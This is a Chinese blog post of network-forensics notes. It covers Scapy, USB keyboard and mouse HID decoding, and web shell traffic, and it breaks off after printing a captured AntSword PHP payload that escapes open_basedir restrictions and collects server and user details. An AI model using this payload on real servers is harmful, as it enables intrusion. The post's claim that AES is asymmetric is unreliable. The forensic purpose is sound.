<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width">
<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 6.3.0">

  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16.png">
  <link rel="mask-icon" href="/images/favicon.ico" color="#222">

<link rel="stylesheet" href="/css/main.css">



<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" integrity="sha256-HtsXJanqjKTc8vVQjO4YMhiqFoXkfBsjBWcX91T1jr8=" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/themes/blue/pace-theme-flash.css">
  <script src="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/pace.min.js" integrity="sha256-gqd7YTjg/BtfqWSwsJOvndl0Bxc8gFImLEkXQT8+qj0=" crossorigin="anonymous"></script>

<script class="next-config" data-name="main" type="application/json">{"hostname":"hasegawaazusa.github.io","root":"/","images":"/images","scheme":"Gemini","darkmode":false,"version":"8.15.1","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":{"enable":true,"style":null},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.xml","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":true}}</script><script src="/js/config.js"></script>

    <meta name="description" content="有关流量分析的简要笔记，包括但不限于WebShell、SMB、USB流量">
<meta property="og:type" content="article">
<meta property="og:title" content="流量分析笔记">
<meta property="og:url" content="https://hasegawaazusa.github.io/traffic-analysis-note.html">
<meta property="og:site_name" content="独奏の小屋">
<meta property="og:description" content="有关流量分析的简要笔记，包括但不限于WebShell、SMB、USB流量">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://hasegawaazusa.github.io/traffic-analysis-note/TCPIP%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84.png">
<meta property="og:image" content="https://hasegawaazusa.github.io/traffic-analysis-note/PDU%E7%BB%93%E6%9E%84.png">
<meta property="article:published_time" content="2023-02-28T07:00:00.000Z">
<meta property="article:modified_time" content="2024-03-12T13:03:29.483Z">
<meta property="article:author" content="qsdz">
<meta property="article:tag" content="forensics">
<meta property="article:tag" content="traffic">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://hasegawaazusa.github.io/traffic-analysis-note/TCPIP%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84.png">


<link rel="canonical" href="https://hasegawaazusa.github.io/traffic-analysis-note.html">



<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://hasegawaazusa.github.io/traffic-analysis-note.html","path":"/traffic-analysis-note.html","title":"流量分析笔记"}</script>

<script class="next-config" data-name="calendar" type="application/json">""</script>
<title>流量分析笔记 | 独奏の小屋</title>
  








  <noscript>
    <link rel="stylesheet" href="/css/noscript.css">
  </noscript>
</head>

<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
  <div class="headband"></div>

  <main class="main">
    <div class="column">
      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏" role="button">
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <i class="logo-line"></i>
      <p class="site-title">独奏の小屋</p>
      <i class="logo-line"></i>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger" aria-label="搜索" role="button">
        <i class="fa fa-search fa-fw fa-lg"></i>
    </div>
  </div>
</div>



<nav class="site-nav">
  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签<span class="badge">65</span></a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档<span class="badge">129</span></a></li>
      <li class="menu-item menu-item-search">
        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
        </a>
      </li>
  </ul>
</nav>



  <div class="search-pop-overlay">
    <div class="popup search-popup"><div class="search-header">
  <span class="search-icon">
    <i class="fa fa-search"></i>
  </span>
  <div class="search-input-container">
    <input autocomplete="off" autocapitalize="off" maxlength="80"
           placeholder="搜索..." spellcheck="false"
           type="search" class="search-input">
  </div>
  <span class="popup-btn-close" role="button">
    <i class="fa fa-times-circle"></i>
  </span>
</div>
<div class="search-result-container no-result">
  <div class="search-result-icon">
    <i class="fa fa-spinner fa-pulse fa-5x"></i>
  </div>
</div>

    </div>
  </div>

</header>
        
  
  <aside class="sidebar">

    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
      <ul class="sidebar-nav">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <div class="sidebar-panel-container">
        <!--noindex-->
        <div class="post-toc-wrap sidebar-panel">
            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%9F%BA%E7%A1%80"><span class="nav-number">1.</span> <span class="nav-text">基础</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-number">1.1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%BD%91%E7%BB%9C%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84"><span class="nav-number">1.2.</span> <span class="nav-text">网络体系结构</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#scapy"><span class="nav-number">1.3.</span> <span class="nav-text">SCAPY</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#usb%E6%B5%81%E9%87%8F"><span class="nav-number">2.</span> <span class="nav-text">USB流量</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%94%AE%E7%9B%98%E6%B5%81%E9%87%8F"><span class="nav-number">2.1.</span> <span class="nav-text">键盘流量</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%BC%A0%E6%A0%87%E6%B5%81%E9%87%8F"><span class="nav-number">2.2.</span> <span class="nav-text">鼠标流量</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#webshell-%E6%B5%81%E9%87%8F"><span class="nav-number">3.</span> <span class="nav-text">WebShell 流量</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#antsword"><span class="nav-number">3.1.</span> <span class="nav-text">AntSword</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%8A%93%E5%8C%85"><span class="nav-number">3.1.1.</span> <span class="nav-text">抓包</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%B8%BB%E9%80%BB%E8%BE%91"><span class="nav-number">3.1.2.</span> <span class="nav-text">主逻辑</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%BC%96%E7%A0%81%E5%99%A8%E4%B8%8E%E8%A7%A3%E7%A0%81%E5%99%A8"><span class="nav-number">3.1.3.</span> <span class="nav-text">编码器与解码器</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%98%B2%E5%BE%A1"><span class="nav-number">3.1.4.</span> <span class="nav-text">防御</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#behinder"><span class="nav-number">3.2.</span> <span class="nav-text">Behinder</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%8A%93%E5%8C%85-1"><span class="nav-number">3.2.1.</span> <span class="nav-text">抓包</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%80%86%E5%90%91"><span class="nav-number">3.2.2.</span> <span class="nav-text">逆向</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%98%B2%E5%BE%A1-1"><span class="nav-number">3.2.3.</span> <span class="nav-text">防御</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#godzilla"><span class="nav-number">3.3.</span> <span class="nav-text">Godzilla</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%8A%93%E5%8C%85-2"><span class="nav-number">3.3.1.</span> <span class="nav-text">抓包</span></a></li></ol></li></ol></li></ol></div>
        </div>
        <!--/noindex-->

        <div class="site-overview-wrap sidebar-panel">
          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="qsdz"
      src="/images/android-chrome-144x144.png">
  <p class="site-author-name" itemprop="name">qsdz</p>
  <div class="site-description" itemprop="description">又菜又爱玩，望轻喷</div>
</div>
<div class="site-state-wrap animated">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
        <a href="/archives/">
          <span class="site-state-item-count">129</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
      <div class="site-state-item site-state-tags">
          <a href="/tags/">
        <span class="site-state-item-count">65</span>
        <span class="site-state-item-name">标签</span></a>
      </div>
  </nav>
</div>
  <div class="links-of-author animated">
      <span class="links-of-author-item">
        <a href="https://github.com/HasegawaAzusa" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;HasegawaAzusa" rel="noopener me" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
      </span>
  </div>
  <div class="cc-license animated" itemprop="license">
    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" class="cc-opacity" rel="noopener" target="_blank"><img src="https://cdnjs.cloudflare.com/ajax/libs/creativecommons-vocabulary/2020.11.3/assets/license_badges/small/by_nc_sa.svg" alt="Creative Commons"></a>
  </div>

        </div>
      </div>
    </div>

    
  </aside>


    </div>

    <div class="main-inner post posts-expand">


  


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://hasegawaazusa.github.io/traffic-analysis-note.html">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/android-chrome-144x144.png">
      <meta itemprop="name" content="qsdz">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="独奏の小屋">
      <meta itemprop="description" content="又菜又爱玩，望轻喷">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="流量分析笔记 | 独奏の小屋">
      <meta itemprop="description" content="有关流量分析的简要笔记，包括但不限于WebShell、SMB、USB流量">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          流量分析笔记
        </h1>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2023-02-28 15:00:00" itemprop="dateCreated datePublished" datetime="2023-02-28T15:00:00+08:00">2023-02-28</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar-check"></i>
      </span>
      <span class="post-meta-item-text">更新于</span>
      <time title="修改时间：2024-03-12 21:03:29" itemprop="dateModified" datetime="2024-03-12T21:03:29+08:00">2024-03-12</time>
    </span>

  
    <span class="post-meta-break"></span>
    <span class="post-meta-item" title="本文字数">
      <span class="post-meta-item-icon">
        <i class="far fa-file-word"></i>
      </span>
      <span class="post-meta-item-text">本文字数：</span>
      <span>18k</span>
    </span>
    <span class="post-meta-item" title="阅读时长">
      <span class="post-meta-item-icon">
        <i class="far fa-clock"></i>
      </span>
      <span class="post-meta-item-text">阅读时长 &asymp;</span>
      <span>16 分钟</span>
    </span>
</div>

            <div class="post-description">有关流量分析的简要笔记，包括但不限于WebShell、SMB、USB流量</div>
        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
        <h1 id="基础">基础</h1>
<h2 id="前言">前言</h2>
<p>流量分析（Traffic Analysis）又可以称作是网络取证（Network
Forensics），正如其名，就是对<strong>计算机或计算机网络通信所产生的流量进行分析的一门技术</strong>。</p>
<p><strong>只要有通信就会产生流量。</strong></p>
<p>在这里不过多赘述概念，本篇博客将注重于记录各种有特点的流量分析，或者是协议分析等。</p>
<p>主要使用的软件是 Wireshark 和 Python，其中需要借助 Scapy 库。</p>
<h2 id="网络体系结构">网络体系结构</h2>
<p>TCP/IP
是因特网上的<strong>标准通信协议集</strong>，它不是针对某一个协议（例如
TCP 协议或 IP 协议）。</p>
<p>TCP/IP 的体系结构分为 4 层，分别是</p>
<table>
<thead>
<tr class="header">
<th>TCP/IP</th>
<th>功能</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>应用层</td>
<td>FTP，SMTP，HTTP 等上层协议</td>
</tr>
<tr class="even">
<td>传输层</td>
<td>TCP/UDP</td>
</tr>
<tr class="odd">
<td>网络互连层</td>
<td>把数据分组发往目标网络或主机</td>
</tr>
<tr class="even">
<td>网络接口层</td>
<td>负责与物理网络的连接</td>
</tr>
</tbody>
</table>
<p>其中为了方便讲解和理解，网络接口层一般被拆分为<strong>数据链路层</strong>和<strong>物理层</strong>。</p>
<figure>
<img src="/traffic-analysis-note/TCPIP%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84.png" alt="TCP/IP体系结构">
<figcaption aria-hidden="true">TCP/IP体系结构</figcaption>
</figure>
<p>而在网络通信中传输的最小单元，即协议数据单元
PDU，是数据在不同层次上的封装单元，它包含了特定协议层所需的信息。</p>
<p>每个协议层都将上一层的数据包装成PDU，然后传递给下一层，<strong>自上而下层层封装</strong>。</p>
<h2 id="scapy">SCAPY</h2>
<p>Scapy 就是协议数据单元 PDU 的概念制作和分析报文的。</p>
<p>例如说一个最简单的 HTTP
协议完整报文应该是由数据链路层，网络层，传输层和应用层的协议封装而成的，那么在
Scapy 中，仅需简单拼接即可得到</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> scapy.layers.l2 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> scapy.layers.inet <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">packet = Ether() / IP() / TCP() / <span class="string">&quot;GET / HTTP/1.1\r\n&quot;</span></span><br></pre></td></tr></table></figure>
<p>回显为</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;Ether  type=IPv4 |&lt;IP  frag=0 proto=tcp |&lt;TCP  |&lt;Raw  load=&#x27;GET / HTTP/1.1\r\n&#x27; |&gt;&gt;&gt;&gt;</span><br></pre></td></tr></table></figure>
<p>协议头与数据的概念一目了然。</p>
<figure>
<img src="/traffic-analysis-note/PDU%E7%BB%93%E6%9E%84.png" alt="PDU结构">
<figcaption aria-hidden="true">PDU结构</figcaption>
</figure>
<h1 id="usb流量">USB流量</h1>
<p>计算机与 USB 设备进行通信，同样也会产生流量，不过我们主要关注 HID USB
设备所产生的流量。</p>
<p>USB-IF 组织总结了标准 HID USB 设备的定义和使用等相关的文档，可以参考
<a target="_blank" rel="noopener" href="https://www.usb.org/sites/default/files/hut1_5.pdf">HID Usage
Tables</a>，以下简称 <strong>HIDUT</strong>。</p>
<p>其中 HIDUT 有两份文件，一份是 PDF 文档，一份是 PDF 文档的附加文件
<code>HidUsageTables.json</code>，PDF 文档内容用于解释 JSON 数据。</p>
<blockquote>
<p>推荐使用 Adobe Acrobat Reader
提取附件，可以附加附件的功能暂且也只有该软件提供。</p>
</blockquote>
<p>有关流量协议部分，可以参考微软官方文档：</p>
<ul>
<li><p><a target="_blank" rel="noopener" href="https://learn.microsoft.com/en-us/windows-hardware/drivers/hid/">HID
简介</a></p></li>
<li><p><a target="_blank" rel="noopener" href="https://learn.microsoft.com/en-us/windows-hardware/drivers/usbcon/communicating-with-a-usb-device">USB
请求块（URB）</a></p></li>
<li><p><a target="_blank" rel="noopener" href="https://learn.microsoft.com/en-us/windows-hardware/drivers/usbcon/usb-bulk-and-interrupt-transfer">USB
请求</a></p></li>
</ul>
<p>简单来说，HID 由两个部分组成：</p>
<ul>
<li>报告描述符（Report
Descriptor）：描述了设备支持的数据的格式和含义</li>
<li>报告（Report）：设备和软件客户端之间交换的实际数据，即携带的 HID
Data。</li>
</ul>
<p>报告的长度在一定程度上是固定的 8 字节，这是因为 CMOS
启动固件不处理报告描述符，故报告的缓冲区大小就是固定的 8 字节。</p>
<blockquote>
<p>如果报告的长度大于 8 字节，那么在 BIOS 阶段无法识别设备信息。</p>
</blockquote>
<h2 id="键盘流量">键盘流量</h2>
<p>对于键盘设备的 HID 数据在文档中有着严格定义，详细可以参考 <em>10
Keyboard/Keypad Page (0x07)</em>，其 Usage Page Id
为<code>0x07</code>。</p>
<p>理论上来说一个 HID 键盘设备仅需三个字节就可以描述一次输入，其中</p>
<ul>
<li><code>Bytes[0]</code> 是<strong>修饰键</strong></li>
<li><code>Bytes[1]</code> 是<strong>保留字节</strong></li>
<li><code>Bytes[2]</code> 是<strong>映射键</strong>。</li>
</ul>
<p>如果长度为 8 字节，那么其后六个字节 <code>Bytes[2:8]</code>
是同时按下的映射键。</p>
<blockquote>
<p>如果更多，可能有其他用途。</p>
</blockquote>
<p>键盘布局参考：<a target="_blank" rel="noopener" href="https://learn.microsoft.com/en-us/globalization/keyboards/kbdus_2">中文（简体）-美式键盘</a>。</p>
<p><a target="_blank" rel="noopener" href="https://github.com/HasegawaAzusa/TrafficAnalysisTools">脚本参考</a>。</p>
<h2 id="鼠标流量">鼠标流量</h2>
<p>对于鼠标设备的 HID 数据，最少需要三字节（Linux 的
micelog），常规还有短的 4 字节，其中</p>
<ul>
<li><code>Bytes[0]</code> 是按键掩码（左中右）</li>
<li><code>Bytes[1]</code> 是指针 x 轴偏移量</li>
<li><code>Bytes[2]</code> 是指针 y 轴偏移量</li>
<li><code>Bytes[3]</code> 是滚轮偏移量</li>
</ul>
<p>正常是 8 字节，其中</p>
<ul>
<li><code>Bytes[0]</code> 是按键掩码（左中右）</li>
<li><code>Bytes[2:4]</code> 是指针 x 轴偏移量</li>
<li><code>Bytes[4:6]</code> 是指针 y 轴偏移量</li>
<li><code>Bytes[6]</code> 是垂直滚轮偏移量</li>
<li><code>Bytes[7]</code> 是水平滚轮偏移量</li>
</ul>
<p><strong>所有偏移量均是补码形式。</strong></p>
<p><a target="_blank" rel="noopener" href="https://github.com/HasegawaAzusa/TrafficAnalysisTools">脚本参考</a>。</p>
<h1 id="webshell-流量">WebShell 流量</h1>
<p>WebShell
流量分析是威胁分析中比较重要的部分，旨在监测、识别和分析网络中传输的
WebShell 相关流量，包括但不限于应急响应，自动化监测等。</p>
<p>WebShell流量分析需要具备相关的网络安全知识，能够识别恶意代码、特定命令和异常行为，并最好能够追踪和溯源攻击者的来源和行为，包括分析其中的IP地址、用户代理或请求参数等信息。</p>
<p>简单的WebShell常常采用一句话木马，利用简单的HTTP请求传递参数，以实现远程执行命令（Remote
Code Execution，RCE）的行为。</p>
<p>防护措施不断升级，最简单的防御方法之一是监测传递的参数中是否含有敏感词。然而，出于对抗监测的目的，一些
WebShell 使用了 Base64 等编码方式对参数进行隐藏。这导致了一些 WebShell
管理和注入软件的出现，例如菜刀（Cknife）、AntSword 等。</p>
<p>更高级的WebShell常常采用AES等非对称加密对传递的参数进行加密执行，例如冰蝎（Behinder）等，采用了更复杂的编码和通信方式，以增加检测和防御的难度。这些工具不仅能够对传递的参数进行加密隐藏，还可能通过多个通信协议进行通信，如
HTTP、DNS、ICMP 等，使得流量更难以被检测和分析。</p>
<p>故在此记录并总结常见 WebShell 流量的特征与分析。</p>
<h2 id="antsword">AntSword</h2>
<h3 id="抓包">抓包</h3>
<p>AntSword 基于中国菜刀开发，支持多种类型的 WebShell，具体可以参考<a target="_blank" rel="noopener" href="https://www.yuque.com/antswordproject/antsword/iunkur">官方文档</a>和<a target="_blank" rel="noopener" href="https://github.com/AntSwordProject/AwesomeScript">官方仓库</a>。</p>
<p>首先先进行简单的抓包，只尝试连接，得到的负载代码如下（经过格式化处理）</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line">@<span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;display_errors&quot;</span>, <span class="string">&quot;0&quot;</span>);</span><br><span class="line">@<span class="title function_ invoke__">set_time_limit</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$opdir</span> = @<span class="title function_ invoke__">ini_get</span>(<span class="string">&quot;open_basedir&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$opdir</span>) &#123;</span><br><span class="line">    <span class="variable">$ocwd</span> = <span class="title function_ invoke__">dirname</span>(<span class="variable">$_SERVER</span>[<span class="string">&quot;SCRIPT_FILENAME&quot;</span>]);</span><br><span class="line">    <span class="variable">$oparr</span> = <span class="title function_ invoke__">preg_split</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="string">&quot;Lzt8Oi8=&quot;</span>), <span class="variable">$opdir</span>);</span><br><span class="line">    @<span class="title function_ invoke__">array_push</span>(<span class="variable">$oparr</span>, <span class="variable">$ocwd</span>, <span class="title function_ invoke__">sys_get_temp_dir</span>());</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$oparr</span> <span class="keyword">as</span> <span class="variable">$item</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!@<span class="title function_ invoke__">is_writable</span>(<span class="variable">$item</span>)) &#123;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="variable">$tmdir</span> = <span class="variable">$item</span> . <span class="string">&quot;/.5b36e59748b&quot;</span>;</span><br><span class="line">        @<span class="title function_ invoke__">mkdir</span>(<span class="variable">$tmdir</span>);</span><br><span class="line">        <span class="keyword">if</span> (!@<span class="title function_ invoke__">file_exists</span>(<span class="variable">$tmdir</span>)) &#123;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$tmdir</span> = <span class="title function_ invoke__">realpath</span>(<span class="variable">$tmdir</span>);</span><br><span class="line">        @<span class="title function_ invoke__">chdir</span>(<span class="variable">$tmdir</span>);</span><br><span class="line">        @<span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;open_basedir&quot;</span>, <span class="string">&quot;..&quot;</span>);</span><br><span class="line">        <span class="variable">$cntarr</span> = @<span class="title function_ invoke__">preg_split</span>(<span class="string">&quot;/\\\\|\//&quot;</span>, <span class="variable">$tmdir</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="title function_ invoke__">sizeof</span>(<span class="variable">$cntarr</span>); <span class="variable">$i</span>) &#123;</span><br><span class="line">            @<span class="title function_ invoke__">chdir</span>(<span class="string">&quot;..&quot;</span>);</span><br><span class="line">        &#125;;</span><br><span class="line">        @<span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;open_basedir&quot;</span>, <span class="string">&quot;/&quot;</span>);</span><br><span class="line">        @<span class="title function_ invoke__">rmdir</span>(<span class="variable">$tmdir</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;;;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">asenc</span>(<span class="params"><span class="variable">$out</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$out</span>;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">asoutput</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$output</span> = <span class="title function_ invoke__">ob_get_contents</span>();</span><br><span class="line">    <span class="title function_ invoke__">ob_end_clean</span>();</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;75b9&quot;</span> . <span class="string">&quot;e75f9&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> @<span class="title function_ invoke__">asenc</span>(<span class="variable">$output</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;94&quot;</span> . <span class="string">&quot;c37&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">ob_start</span>();</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="variable">$D</span> = <span class="title function_ invoke__">dirname</span>(<span class="variable">$_SERVER</span>[<span class="string">&quot;SCRIPT_FILENAME&quot;</span>]);</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$D</span> == <span class="string">&quot;&quot;</span>) <span class="variable">$D</span> = <span class="title function_ invoke__">dirname</span>(<span class="variable">$_SERVER</span>[<span class="string">&quot;PATH_TRANSLATED&quot;</span>]);</span><br><span class="line">    <span class="variable">$R</span> = <span class="string">&quot;<span class="subst">&#123;$D&#125;</span>	&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">substr</span>(<span class="variable">$D</span>, <span class="number">0</span>, <span class="number">1</span>) != <span class="string">&quot;/&quot;</span>) &#123;</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="title function_ invoke__">range</span>(<span class="string">&quot;C&quot;</span>, <span class="string">&quot;Z&quot;</span>) <span class="keyword">as</span> <span class="variable">$L</span>) <span class="keyword">if</span> (<span class="title function_ invoke__">is_dir</span>(<span class="string">&quot;<span class="subst">&#123;$L&#125;</span>:&quot;</span>)) <span class="variable">$R</span> .= <span class="string">&quot;<span class="subst">&#123;$L&#125;</span>:&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$R</span> .= <span class="string">&quot;/&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$R</span> .= <span class="string">&quot;	&quot;</span>;</span><br><span class="line">    <span class="variable">$u</span> = (<span class="title function_ invoke__">function_exists</span>(<span class="string">&quot;posix_getegid&quot;</span>)) ? @<span class="title function_ invoke__">posix_getpwuid</span>(@<span class="title function_ invoke__">posix_geteuid</span>()) : <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="variable">$s</span> = (<span class="variable">$u</span>) ? <span class="variable">$u</span>[<span class="string">&quot;name&quot;</span>] : @<span class="title function_ invoke__">get_current_user</span>();</span><br><span class="line">    <span class="variable">$R</span> .= <span class="title function_ invoke__">php_uname</span>();</span><br><span class="line">    <span class="variable">$R</span> .= <span class="string">&quot;	<span class="subst">&#123;$s&#125;</span>&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$R</span>;;</span><br><span class="line">&#125; <span class="keyword">catch</span> (<span class="built_in">Exception</span> <span class="variable">$e</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;ERROR://&quot;</span> . <span class="variable">$e</span>-&gt;<span class="title function_ invoke__">getMessage</span>();</span><br><span class="line">&#125;;</span><br><span class="line"><span class="title function_ invoke__">asoutput</span>();</span><br><span 